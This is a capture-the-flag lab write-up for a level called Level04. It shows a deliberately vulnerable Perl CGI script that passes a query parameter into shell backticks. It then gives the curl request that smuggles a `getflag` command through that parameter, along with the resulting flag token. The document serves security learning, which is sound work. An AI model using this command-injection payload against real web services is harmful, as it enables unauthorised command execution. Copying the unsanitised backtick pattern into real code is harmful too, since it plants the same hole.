# Level04 Solution

## Steps:
1. Connected via SSH: `ssh level04@192.168.16.128 -p 4242`
2. Found a Perl script in the home directory:
   - File: `/home/user/level04/level04.pl`
   - Code:
     ```perl
     #!/usr/bin/perl
     use CGI qw{param};
     print "Content-type: text/html\n\n";
     sub x {
       $y = $_[0];
       print `echo $y 2>&1`;
     }
     x(param("x"));
     ```
3. Identified the vulnerability:
   - The script uses backticks \`echo $y\` to execute a shell command.
   - The user input `$y` (from the query parameter `x`) is directly inserted into the command without sanitization.
   - This allows **command injection**.
4. Exploited the vulnerability via curl:
   - Command:
     ```bash
     curl http://localhost:4747?x='`getflag`'
     ```
   - This injects `getflag` into the shell command, which is executed by the Perl script.
5. Obtained the token:
   - Output: `Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap`

## Notes:
- The Perl script is a CGI script that runs a web server on port 4747.
- Backticks in Perl execute shell commands, so user input must be sanitized.
- The injection `\`getflag\`` is passed via the `x` parameter and executed.

## Tools used:
- `curl` (to send the HTTP request)
- Command injection technique

## Vulnerability:
- Command injection via unsanitized user input in backticks.